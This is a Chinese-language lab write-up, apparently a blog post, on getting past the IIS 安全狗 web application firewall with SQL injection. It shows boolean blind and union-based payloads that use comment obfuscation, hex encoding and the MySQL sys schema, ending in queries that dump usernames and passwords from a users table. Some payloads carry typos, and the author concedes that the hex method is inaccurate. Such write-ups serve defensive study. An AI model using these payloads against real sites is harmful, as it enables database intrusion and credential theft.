​首先呢服务器上安装的是一个最新版的iis安全狗

![](https://image.3001.net/images/20221021/1666323089_63521291131d8497cc4f7.png!small)​编辑

UUUUUUUUUUUUUUUUUUUU

这里将防护等级也设置成高级

![](https://image.3001.net/images/20221021/1666323089_63521291eb9a028f25716.png!small)​编辑

部署好我们的靶场

首先用布尔注入的方式尝试绕过第一个整型注入

![](https://image.3001.net/images/20221021/1666323090_63521292cb37697423e20.png!small)​编辑

将我们的靶场整型注入改成get的提交方式

![](https://image.3001.net/images/20221021/1666323091_635212938c843f9e3721e.png!small)​编辑

成功修改为get了

![](https://image.3001.net/images/20221021/1666323092_635212946d23a1e26b66c.png!small)​编辑

首先一如即让，探测一下是否存在注入

因为是get注入所以我们可以直接构造

and 1=1

显然行不通啊，那咱换个方式

![](https://image.3001.net/images/20221021/1666323093_63521295a79c608e50070.png!small)​编辑

这里我们用id=\Nor+0x30=0x30

可以明显判断出这里是存在注入的

![](https://image.3001.net/images/20221021/1666323094_63521296cb8d303de4f03.png!small)​编辑

接下来构造语法获取当前数据库版本

先使用常规的试试

ascii(substr(version(),2,1)=100)

显然也是不行，这里可以来判断一下是哪个字符被拦截了

![](https://image.3001.net/images/20221021/1666323095_63521297dca056cf375b9.png!small)​编辑

就挺尴尬，and被拦截了

![](https://image.3001.net/images/20221021/1666323096_635212989e67def5e8c3d.png!small)​编辑

尝试绕过

ascii(substr(@@version,2,1))<70

成功得到回显

![](https://image.3001.net/images/20221021/1666323097_63521299a2f441f4f44ec.png!small)​编辑

接下来想办法拿到数据库名

常规的database（）肯定是不行，盲猜这里做了屏蔽

![](https://image.3001.net/images/20221021/1666323099_6352129b1152b2e5b3e37.png!small)​编辑

结果也很明显

更正语法，将被过滤的database()转换成hex成功绕过（此处修改一下，hex结果不准确，建议用下面union的绕过方式更正

![](https://image.3001.net/images/20221021/1666323099_6352129bb67a8ee3318f2.png!small)​编辑

接下来就更简单了，跑包都呗?扔到burp一跑就能出结果

md布尔盲注太痛苦了，就不演示接下来的操作了，各位自行脑补

![](https://image.3001.net/images/20221021/1666323100_6352129c6582ace50b8c6.png!small)​编辑

此处水100字

![](https://image.3001.net/images/20221021/1666323101_6352129d60cfd9593f1e1.png!small)​编辑

到这里，可以看到能成功获取密码

okk结束~（做的时候没截屏，懒得再做一遍哈哈哈）

又来吧，这次是字符型的布尔！

痛苦面具再次戴上

一波测试下来

万能公式

and 0x30!=0x30(比较符不能更改替换值得到结果)

![](https://image.3001.net/images/20221021/1666323102_6352129e6818907528d42.png!small)​编辑

接下来构造语句，vince’ and 0x30!=if(substr(@@version from for)=5),0x31,0x30)

这句不用我解释了吧，很简单的

![](https://image.3001.net/images/20221021/1666323103_6352129f4dbc8523cc453.png!small)​编辑

不成立效果

![](https://image.3001.net/images/20221021/1666323104_635212a0801115da80ed3.png!small)​编辑

如果看不懂from+1+for+1是个啥玩意的话

![](https://image.3001.net/images/20221021/1666323105_635212a16a6d6c9fabb6c.png!small)​编辑

用你熟悉的也行，这里科普一下为啥鄙人要用稍微麻烦点的姿势

部分waf会拦截逗号，所以这里为了‘不必要的麻烦’就用了这么一种绕过的姿势，但显然，某狗不拦截逗号

所以后面的玩意儿咱就不做了吧~

算了，还是稍微演示一下别又说我水帖

![](https://image.3001.net/images/20221021/1666323106_635212a23e21c63bc2bfa.png!small)​编辑

首先这个姿势肯定不行，waf拦截了关键词

还是那个办法，转成hex试试(这个位置也是，更正一下使用，用union的方法，hex不准确)

![](https://image.3001.net/images/20221021/1666323107_635212a32891786c31c62.png!small)​编辑

姿势到位，ok往后咱就不做了，别说我水，确实麻烦

接下来就是union的绕过了

这次尽量不水哈哈哈

还是先从整型开始吧

探测没啥好说，不理解的自己往上翻翻

![](https://image.3001.net/images/20221021/1666323108_635212a4018cedb9e0bc7.png!small)​编辑

这个位置order by是被拦截的

我们可以构造一些乱七八糟的语法比如

![](https://image.3001.net/images/20221021/1666323108_635212a4cb27d3dc46911.png!small)​编辑

这样他就不拦截了

（order by 测出只有俩列）

ok上戏

构造union语法,这个会呗不用教呗

但是，order by 都会被拦截，union select不用想直接死

这里可以试试上面吧的绕过方式

![](https://image.3001.net/images/20221021/1666323109_635212a596f6734310795.png!small)​编辑

成功绕过

到这里，可以看下图，发现带入查询的话，会被拦截，但是问题不大，它拦截，咱就绕过呗

![](https://image.3001.net/images/20221021/1666323110_635212a683d4d032b0494.png!small)​编辑

有点曲折但成功绕过

![](https://image.3001.net/images/20221021/1666323111_635212a79b58a47369eb2.png!small)​编辑

ok往下继续构造

union select 1, group_concat(table.name from information_schema.tables where
table.schema=database())

1+union/*//--//*/select+1,table.name+from+information_schema.tables+where+table.schema=database/*!77777777777777777777777777777777777777afafdfdaddddddddddddddddd*/())

依旧被拦截，这里拆开看一下，发现是informatin_schema.tables被拦截了，试过从中间隔断发现效果并不理想

查询了一点资料（姿势储备不足）

悟到一个小姿势点，既然information_schema被过滤，那咱可以换一个呀不用去想着绕过撒

mysql5.7+的版本新增了sys schema

这里知道了语法便重新构造语法

group_concat(table_name) from sys.schema_auto_increment_columns where
table_schema=database()--+

这里拿到 表，开始往下构造

直接到最后一步

获取账号密码

union/*//--//*/select+1,oup_concat(username,password)from `users`+limit+1

![](https://image.3001.net/images/20221021/1666323112_635212a86082f3bfb01ed.png!small)​编辑

接下来是字符型的union

上面操作不再演示了，直接到最后一步

vince'+union/*//--//*/select+1,group_concat(username,password)+from+`users`+limit+2--+

语法大差不差，最后一步确实不难，难的是中间

![](https://image.3001.net/images/20221021/1666323113_635212a91b1bb01faafb5.png!small)​post的后面再做演示

